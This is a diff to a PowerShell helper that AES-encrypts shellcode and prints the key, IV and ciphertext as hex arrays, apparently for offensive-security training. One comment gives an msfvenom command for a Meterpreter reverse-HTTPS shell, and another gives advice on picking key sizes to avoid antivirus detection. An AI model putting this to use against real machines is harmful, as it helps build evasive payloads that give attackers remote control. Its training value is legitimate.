@@ -2,6 +2,7 @@ function Get-RandomBytes($Size) {
     $rb = [Byte[]]::new($Size)
     $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
     $rng.GetBytes($rb)
+    $rng.Dispose()
     return $rb
 }
 
@@ -33,16 +34,22 @@ function Format-ByteArrayToHex($Bytes, $VarName) {
 
 function Encrypt-Bytes($Bytes, $Key, $IV) {
     $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
-    # Some vendors flag payloads more that use 256 vs 128. Something to keep in mind.
-    $aes.KeySize = 128
-    $aes.BlockSize = 128
-    $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
 
+    # 128-bit / 192-bit / 256-bit
+    # I found that some vendors flag payloads more that use 256 vs 128. Something to keep in mind.
+    $aes.KeySize = 128
+    
+    # AES is a 128-bit block cipher so this won't change between 128-bit/192-bit/256-bit keys
+    $aes.BlockSize = 128
+    
+    $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
     $aes.key = $Key
     $aes.IV = $IV
 
     $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)
     $encrypted = $encryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)
+    
+    # If you keep powershell open this will stay in memory, dispose those secrets!
     $aes.Dispose() 
     return $encrypted
 }
@@ -60,12 +67,16 @@ function Decrypt-Bytes($Bytes, $Key, $IV) {
 
     $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)
     $decrypted = $decryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length) 
+
+    # If you keep powershell open this will stay in memory, dispose those secrets!
     $aes.Dispose()
     return $decrypted
 }
 
 # 16 Bytes > AES-128 | 24 Bytes > AES-192 | 32 Bytes > AES-256
 [Byte[]]$Key = Get-RandomBytes -Size 16
+
+# This does not change between different key lengths
 [Byte[]]$IV = Get-RandomBytes -Size 16
 
 # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.X.X LPORT=443 EXITFUNC=thread -f ps1 -v payload
@@ -78,11 +89,11 @@ $encBytes = Encrypt-Bytes -Bytes $payload -Key $Key -IV $IV
 $decBytes = Decrypt-Bytes -Bytes $encBytes -Key $Key -IV $IV
 
 # Format our byte array into a variable format we can use later
-$keyStr = Format-ByteArrayToHex -Bytes $key -VarName OffSec
-$ivStr = Format-ByteArrayToHex -Bytes $iv -VarName Says
-$rawStr = Format-ByteArrayToHex -Bytes $payload -VarName Try
-$encStr = Format-ByteArrayToHex -Bytes $encBytes -VarName Har
-$decStr = Format-ByteArrayToHex -Bytes $decBytes -VarName der
+$keyStr = Format-ByteArrayToHex -Bytes $key -VarName 'OffSec'
+$ivStr = Format-ByteArrayToHex -Bytes $iv -VarName 'Says'
+$rawStr = Format-ByteArrayToHex -Bytes $payload -VarName 'Try'
+$encStr = Format-ByteArrayToHex -Bytes $encBytes -VarName 'Har'
+$decStr = Format-ByteArrayToHex -Bytes $decBytes -VarName 'der'
 
 # Print results
 Write-Host "[*] Key:"
